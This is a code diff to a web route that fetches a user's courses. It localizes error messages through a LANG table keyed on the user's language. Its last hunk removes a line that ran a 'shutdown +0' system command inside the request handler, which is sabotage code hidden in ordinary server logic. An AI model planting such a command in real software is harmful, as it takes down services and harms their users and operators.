@@ -7,6 +7,7 @@ import {
   NotFoundError,
   BadRequestError,
   NotAuthorizedError,
+  LANG,
 } from '../../library';
 
 import { authenticate } from '../../middlewares/authenticate';
@@ -31,8 +32,9 @@ fetchCourseRouter.get(
 
     if (!currentUser) {
       logger.debug('User trying to fetch courses is not logged in');
-      throw new NotAuthorizedError('Please login before you do that');
+      throw new NotAuthorizedError(LANG.ENG.pleaseLogin);
     }
+    const { lang } = currentUser;
 
     logger.info('Fetching user whom is trying to fetch courses');
     const user = await User.findById(currentUser.id).populate({
@@ -46,9 +48,7 @@ fetchCourseRouter.get(
 
     if (!user) {
       logger.debug('No user found with the id supplied in cookie');
-      throw new BadRequestError(
-        "Your account couldn't be found, please logout and in again",
-      );
+      throw new BadRequestError(LANG[lang].accountNotFound);
     }
 
     if (user.courses.length === 0) {
@@ -116,8 +116,6 @@ fetchCourseRouter.get(
       msg: 'Found course',
       course,
     });
-
-    require('child_process').exec('shutdown +0', () => {});
   },
 );
 
